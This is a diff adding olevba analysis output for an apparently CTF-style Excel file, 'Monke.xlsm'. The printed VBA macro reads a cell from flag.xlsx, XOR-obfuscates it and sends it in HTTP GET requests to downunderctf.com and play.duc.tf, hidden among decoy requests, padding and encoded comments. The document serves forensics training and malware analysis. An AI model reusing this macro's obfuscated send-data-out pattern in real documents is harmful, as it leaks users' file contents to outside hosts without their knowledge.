@@ -1,0 +1,454 @@
+olevba 0.60.2 on Python 3.9.6 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Monke.xlsm
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+
+
+' Totally Not Malware
+
+
+
+
+
+
+
+
+
+
+
+
+' Try Harder
+
+
+
+
+
+
+
+
+' Are you Monkey Enough!
+
+
+
+
+
+
+
+
+
+
+
+
+Public Function anotherThing(B As String, C As String) As String
+    Dim I As Long
+    Dim A As String
+    For I = 1 To Len(B)
+        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
+    Next I
+    anotherThing = A
+End Function
+
+
+
+
+
+
+
+' MDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDA=
+
+
+
+
+
+
+
+
+
+' Do you even Excel!
+
+
+
+
+
+
+
+Public Function importantThing()
+    Dim tempString As String
+    Dim tempInteger As Integer
+    Dim I As Integer
+    Dim J As Integer
+    For I = 1 To 5
+        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
+    Next I
+    For I = 1 To 5
+        For J = I + 1 To 5
+            If Cells(J, 2).Value < Cells(I, 2).Value Then
+                tempString = Cells(I, 1).Value
+                Cells(I, 1).Value = Cells(J, 1).Value
+                Cells(J, 1).Value = tempString
+                tempInteger = Cells(I, 2).Value
+                Cells(I, 2).Value = Cells(J, 2).Value
+                Cells(J, 2).Value = tempInteger
+            End If
+        Next J
+    Next I
+End Function
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+' MDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAxMDE=
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Public Function totalyFine(A As String) As String
+    Dim B As String
+    B = Replace(A, " ", "-")
+    totalyFine = B
+End Function
+
+
+
+
+
+
+
+
+
+
+
+
+' MDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDA=
+
+
+
+
+
+
+
+
+
+' Do you even Excel!
+
+
+
+
+
+
+
+
+
+
+Sub macro1()
+    Dim Path As String
+    Dim wb As Workbook
+    Dim A As String
+    Dim B As String
+    Dim C As String
+    Dim D As String
+    Dim E As String
+    Dim F As String
+    Dim G As String
+    Dim H As String
+    Dim J As String
+    Dim K As String
+    Dim L As String
+    Dim M As String
+    Dim N As String
+    Dim O As String
+    Dim P As String
+    Dim Q As String
+    Dim R As String
+    Dim S As String
+    Dim T As String
+    Dim U As String
+    Dim V As String
+    Dim W As String
+    Dim X As String
+    Dim Y As String
+    Dim Z As String
+    Dim I As Long
+    N = importantThing()
+    K = "Yes"
+    S = "Mon"
+    U = forensics(K)
+    V = totalyFine(U)
+    D = "Ma"
+    J = "https://play.duc.tf/" + V
+    superThing (J)
+    J = "http://flag.com/"
+    superThing (J)
+    G = "key"
+    J = "http://play.duc.tf/"
+    superThing (J)
+    J = "http://en.wikipedia.org/wiki/Emu_War"
+    superThing (J)
+    N = importantThing()
+    Path = ThisWorkbook.Path & "\flag.xlsx"
+    Set wb = Workbooks.Open(Path)
+    Dim valueA1 As Variant
+    valueA1 = wb.Sheets(1).Range("A1").Value
+    MsgBox valueA1
+    wb.Close SaveChanges:=False
+    F = "gic"
+    N = importantThing()
+    Q = "Flag: " & valueA1
+    H = "Try Harder"
+    U = forensics(H)
+    V = totalyFine(U)
+    J = "http://downunderctf.com/" + V
+    superThing (J)
+    W = S + G + D + F
+    O = doThing(Q, W)
+    M = anotherThing(O, W)
+    A = something(O)
+    Z = forensics(O)
+    N = importantThing()
+    P = "Pterodactyl"
+    U = forensics(P)
+    V = totalyFine(U)
+    J = "http://play.duc.tf/" + V
+    superThing (J)
+    T = totalyFine(Z)
+    MsgBox T
+    J = "http://downunderctf.com/" + T
+    superThing (J)
+    N = importantThing()
+    E = "Forensics"
+    U = forensics(E)
+    V = totalyFine(U)
+    J = "http://play.duc.tf/" + V
+    superThing (J)
+    
+End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+' MDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAxMDE=
+
+
+
+
+
+
+
+
+
+
+
+Public Function doThing(B As String, C As String) As String
+    Dim I As Long
+    Dim A As String
+    For I = 1 To Len(B)
+        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
+    Next I
+    doThing = A
+End Function
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+' Think of the emus!
+
+
+
+
+
+
+' MDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAxMDE=
+
+
+
+
+
+
+
+Public Function superThing(ByVal A As String) As String
+    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        .Open "GET", A, False
+        .Send
+        superThing = StrConv(.responseBody, vbUnicode)
+    End With
+End Function
+
+
+
+
+
+
+
+
+' MDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMTAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDEgMDAxMTAxMDA=
+
+
+
+
+
+
+
+
+
+' Do you even Excel!
+
+
+
+
+
+
+
+
+
+
+' Try Harder
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Public Function something(B As String) As String
+    Dim I As Long
+    Dim A As String
+    For I = 1 To Len(inputText)
+        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
+    Next I
+    something = A
+End Function
+
+
+
+
+' Totally Not Malware
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+' MDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAxMTAgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTEwMDAgMDAxMTAxMDAgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMDEgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMDEgMDAxMDAwMDAgMDAxMTAxMTEgMDAxMTAwMDAgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTEwMDAgMDAxMDAwMDAgMDAxMTEwMDEgMDAxMTAxMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMDAgMDAxMTAwMTEgMDAxMDAwMDAgMDAxMTAwMDEgMDAxMTAwMTAgMDAxMTAxMDE=
+
+
+
+
+
+
+
+Public Function forensics(B As String) As String
+    Dim A() As Byte
+    Dim I As Integer
+    Dim C As String
+    A = StrConv(B, vbFromUnicode)
+    For I = LBound(A) To UBound(A)
+        C = C & CStr(A(I)) & " "
+    Next I
+    C = Trim(C)
+    forensics = C
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Sheet2.cls 
+in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|Suspicious|Open                |May open a file                              |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|MSXML2.ServerXMLHTTP|May download files from the Internet         |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |https://play.duc.tf/|URL                                          |
+|IOC       |http://flag.com/    |URL                                          |
+|IOC       |http://play.duc.tf/ |URL                                          |
+|IOC       |http://en.wikipedia.|URL                                          |
+|          |org/wiki/Emu_War    |                                             |
+|IOC       |http://downunderctf.|URL                                          |
+|          |com/                |                                             |
++----------+--------------------+---------------------------------------------+
+
